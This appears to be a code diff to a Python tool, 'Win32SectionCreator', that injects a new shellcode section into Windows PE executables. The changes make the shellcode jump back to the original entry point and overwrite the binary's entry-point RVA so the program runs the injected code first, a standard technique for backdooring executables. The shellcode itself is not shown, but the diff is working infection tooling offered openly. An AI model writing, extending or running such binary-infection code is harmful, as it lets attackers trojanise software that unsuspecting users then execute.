@@ -472,6 +472,9 @@ class Win32SectionCreator():
             base_of_data_rva += self.rva_delta
             MultiByteHandler.set_dword_given_offset(self.binary_data, header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_BASE_OF_DATA_RVA, base_of_data_rva)
 
+
+
+
     def _adjust_windows_specific_headers(self, header_offset, new_section_rva, new_section_virtual_size):
         # SizeOfImage
         size_of_image_offset = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_SIZE_OF_IMAGE
@@ -503,13 +506,27 @@ class Win32SectionCreator():
 
         return
 
-
-    def _file_align_shell_code(self, header_offset):
-        non_padded_shell_code = self.shell_code_generator.get_shell_code()
+    #This parameterized with the JMP address
+    def _file_align_shell_code(self, header_offset, jump_displacement):
+        non_padded_shell_code = self.shell_code_generator.get_base_shell_code(jump_displacement)
         padding_size = Win32BinaryUtils.compute_padding_size_for_file_alignment(self.binary_data, header_offset, len(non_padded_shell_code))
         padded_shell_code = self.shell_code_generator.get_padded_shell_code(padding_size)
         self.shell_code = padded_shell_code
 
+
+    def _overwrite_entrypoint_rva(self, header_offset):
+        #Get current RVA for entrypoint
+        offset_for_address_of_entrypoint_rva_on_the_header =  header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ENTRYPOINT_RVA
+        entrypoint_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_for_address_of_entrypoint_rva_on_the_header)
+
+
+        #Get header offset for new header
+        raw_offset_for_shell_code_section_header = Win32BinaryUtils.get_raw_offset_for_last_section_header(self.binary_data, header_offset)
+        rva_for_shell_code_section_header = MultiByteHandler.get_dword_given_offset(self.binary_data, raw_offset_for_shell_code_section_header + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RVA_WITHIN_SECTION_HEADER)
+
+
+        #Overwrite current RVA for entrypoint with the new one. Not sure if i should change BaseOfCode???
+        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_for_address_of_entrypoint_rva_on_the_header,rva_for_shell_code_section_header)
 
     def modify_binary(self):
 
@@ -527,24 +544,31 @@ class Win32SectionCreator():
         last_section_raw_size = MultiByteHandler.get_dword_given_offset(self.binary_data, beginning_of_last_section_header + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RAW_SIZE_WITHIN_SECTION_HEADER)
         new_section_raw_offset = last_section_raw_offset + last_section_raw_size
 
-        self._file_align_shell_code(header_offset)
+        #RVA for Entrypoint
+        offset_for_address_of_entrypoint_rva_on_the_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ENTRYPOINT_RVA
+        entrypoint_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_for_address_of_entrypoint_rva_on_the_header)
+
+
+        self._file_align_shell_code(header_offset, entrypoint_rva - new_section_rva)
+
+
         self._set_rva_delta(header_offset)
         self._adjust_data_directories(header_offset) #When testing just with the new header, adjust certificate table to take into account the shellcode..
         self._adjust_section_headers(header_offset) #Maybe call this one after incrementing the number of sections??
-        self._adjust_standard_coff_fields_and_coff_header(header_offset, 0x200)#<-Size of code
+        self._adjust_standard_coff_fields_and_coff_header(header_offset, len(self.shell_code))#<-Size of code
 
         #Injecting header
-        new_initialized_header = self._get_new_header(0x200,new_section_rva, 0x200, new_section_raw_offset)
+        new_initialized_header = self._get_new_header(len(self.shell_code),new_section_rva, len(self.shell_code), new_section_raw_offset)
         new_initialized_header.extend([0 for x in range(0,self.header_padding)])
         self._inject_data_at_offset(new_initialized_header, Win32BinaryUtils.get_raw_offset_for_last_section_header(self.binary_data, header_offset))  # since the number of sections is now six, this function will return the pointer to the 6th.
 
         #Injecting shellcode
         self._inject_data_at_offset(self.shell_code, new_section_raw_offset)
-        self._adjust_windows_specific_headers(header_offset, new_section_rva, 0x200)
+        self._adjust_windows_specific_headers(header_offset, new_section_rva, len(self.shell_code))
         Win32BinaryUtils.compute_checksum(self.binary_data, header_offset)
 
-
-        #Inject New Header at Location
+        #Redirect execution to shellcode
+        self._overwrite_entrypoint_rva(header_offset)
 
         return self.binary_data
 
